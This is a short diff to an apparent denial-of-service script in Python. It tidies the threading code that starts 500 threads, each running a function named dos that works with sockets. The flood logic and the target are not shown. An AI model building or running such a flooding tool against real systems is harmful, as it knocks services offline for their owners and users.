@@ -26,20 +26,15 @@ def dos():
             except:
                 sock.close()
                 break  
-e = []
+
 t = []
 n = 500
-for i in range(n+1):
-        e.append(threading.Event())
+
 for i in range(n):
         t.append(threading.Thread(target = dos))
 
 for i in range(n):
         t[i].start()
-for i in range(n):
-        try:
-            e[i].set()
-        except:
-            break
+
 for i in range(n):
         t[i].join()
